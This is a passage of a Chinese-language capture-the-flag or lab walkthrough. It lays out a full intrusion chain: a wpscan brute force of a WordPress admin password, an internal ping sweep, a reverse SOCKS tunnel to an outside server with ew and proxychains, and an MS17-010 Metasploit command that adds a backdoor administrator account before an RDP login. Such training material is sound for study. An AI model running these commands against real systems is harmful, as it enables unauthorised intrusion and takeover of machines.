*   172.30.10.61

### 暴力破解

使用kali下自带的工具wpscan进行破解密码

> 扫描指定用户
> 
> `wpscan --url http://172.30.10.61/ --enumerate u`

![](../Images/ba6f60b4bff1717c5ee8ece5d5ad3ec4.png)

用户名为admin

> 使用top1000暴力破解admin的密码
> 
> `wpscan --url http://172.30.10.61/ -e u --passwords /root/Desktop/wordlist/pass/top1000.txt`
> 
> 需要注意的是最新版wpscan爆破选项为--passwords，旧版本选项为--wordlist

![](../Images/5b5c4c5d020c2a589eec2b2d84ca6917.png)

得到Wordpress管理账号：`admin/1314woaini`

### 内网渗透

查看网络发现另一网段

![](../Images/8a055c57510577a4f5ef0f0ec1319b70.png)

使用如下命令进行内网存活探测

```
for k in $( seq 1 255);do ping -c 1 192.168.42.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done

```

![](../Images/336ce82c451b5e9348495a8b00cbb29d.png)

除了当前主机外还有两台存活主机  

> 192.168.42.2
> 
> 192.168.42.9

使用ew进行代理

上传`ew_for_Linux64`至公网服务器运行如下命令

```

./ew_for_linux64 -s rcsocks -l 1080 -e 1024&
```

上传`ew_for_Linux64`至目标靶机，运行如下命令：

```

 ./ew_for_linux64 -s rssocks -d 1**.***.***.*** -e 1024
```

kali中修改`/etc/proxychains.conf`，在最后一行添加：`socks5 1**.***.***.*** 1080`

！注意：`1**.***.***.***`为公网IP

`proxychains curl 192.168.42.10`

![](../Images/9862f482888964369c28c3fc4cbe97cb.png)

接下来使用proxychains代理进行内网端口扫描，命令为：

```

proxychains nmap -sT -Pn IP
```

经过扫描发现`192.168.42.2`为网关，扫描`192.168.42.9`结果如下（只摘取开放情况）：

```


|S-chain|-<>-1**.***.***.***:1080-<><>-192.168.42.9:445-<><>-OK
```

猜测为windows主机，尝试使用ms17-010漏洞进行攻击

kali下使用proxychains进行msf：`proxychains msfconsole`

添加用户

```

msf6 > use auxiliary/admin/smb/ms17_010_command set command "net user hacker hacker /add"
command
 => net user hacker hacker /addset

 rhost 192.168.42.9
```

添加用户至管理员

```
msf6 auxiliary(admin/smb/ms17_010_command) > set command "net localgroup administrators hacker /add"

```

接下来使用rdesktop远程桌面

```
proxychains rdesktop -g 1440x900 -r disk:LinuxDisk=/root/Downloads -u hacker -p "hacker"
 192.168.42.9:3389
```

在administrator用户的桌面上发现flag5
